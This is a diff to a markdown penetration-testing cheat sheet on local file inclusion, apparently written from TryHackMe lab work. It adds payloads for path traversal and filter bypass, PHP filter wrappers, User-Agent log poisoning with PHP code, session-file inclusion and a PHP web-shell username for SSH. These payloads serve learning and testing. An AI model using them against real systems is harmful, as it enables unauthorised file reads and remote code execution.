@@ -57,7 +57,11 @@ http://example.com/?file=../../../../etc/passwd
 #### Basic Linux Test
 Test for:
 ````
-/script.php?page=../../../../../../../../etc/passwd
+http://example.thm.labs/page.php?file=/etc/passwd 
+http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
+http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
+http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
+http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
 ````
 ### PHP Wrappers
 - PHP has a number of wrappers that can often be abused to bypass various input filters.
@@ -69,12 +73,48 @@ php?page=expect://ls
 #### PHP Filter Wrapper
 `php://filter` allows a pen tester to include local files and base64 encodes the output. Therefore, any base64 output will need to be decoded to reveal the contents.
 ````
-vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd  
+http://example.thm.labs/page.php?file=php://filter/resource=/etc/passwd
+http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
+http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
 ````
-- `php://filter` can also be used without base64 encoding the output using:
+- First one will often fail because it attempts to execute the php code, thus converting to ROT13 or base64 will help achieve LFI
+### LFI to RCE via Log Posioning
+- First find the log file path and attempt to `curl` to it 
 ````
-?page=php://filter/resource=/etc/passwd
+user@machine$ curl -A "This is testing" http://10-10-122-235.p.thmlabs.com/login.php
 ````
+- Should see the evidence of your test in the user agent string logged
+- ![1](https://user-images.githubusercontent.com/75596877/145140973-2ab102e2-f40d-4f16-8a0b-a3582f002d46.png)
+- Now post php code to the log file and then visit the log file location to execute the php code you just injected
+````
+user@machine$ curl -A "<?php phpinfo();?>" http://10-10-122-235.p.thmlabs.com/login.php
+````
+#### LFI to RCE via PHP Sessions
+
+- The LFI to RCE via PHP sessions follows the same concept of the log poisoning technique. 
+- PHP sessions are files within the operating system that store temporary information. After the user logs out of the web application, the PHP session information will be deleted.
+
+- This technique requires enumeration to read the PHP configuration file first, and then we know where the PHP sessions files are. 
+- Then, we include a PHP code into the session and finally call the file via LFI. 
+- PHP stores session data in files within the system in different locations based on the configuration. The following are some of the common locations that the PHP stores in:
+````
+c:\Windows\Temp
+/tmp/
+/var/lib/php5
+/var/lib/php/session
+````
+- Once the attacker finds where PHP stores the session file and can control the value of their session, the attacker can use it to a chain exploit with an LFI to gain remote command execution.
+- To find the PHP session file name, PHP, by default uses the following naming scheme, `sess_<SESSION_ID>` where we can find the `SESSION_ID` using the browser and verifying cookies sent from the server.
+
+- To find the session ID in the browser, you can open the developer tools `(SHIFT+CTRL+I)`, then the Application tab. 
+- From the left menu, select Cookies and select the target website. 
+- There is a `PHPSESSID`  and the value. In my case, the value is `vc4567al6pq7usm2cufmilkm45`. 
+- Therefore, the file will be as `sess_vc4567al6pq7usm2cufmilkm45`. Finally, we know it is stored in `/tmp`. 
+- Now we can use the LFI to call the session file.
+````
+https://10-10-122-235.p.thmlabs.com/login.php?err=/tmp/sess_vc4567al6pq7usm2cufmilkm45
+````
+
 ### RCE via SSH
 - Try to ssh into the box with a PHP code as username <?php system($_GET["cmd"]);?>.
 ````
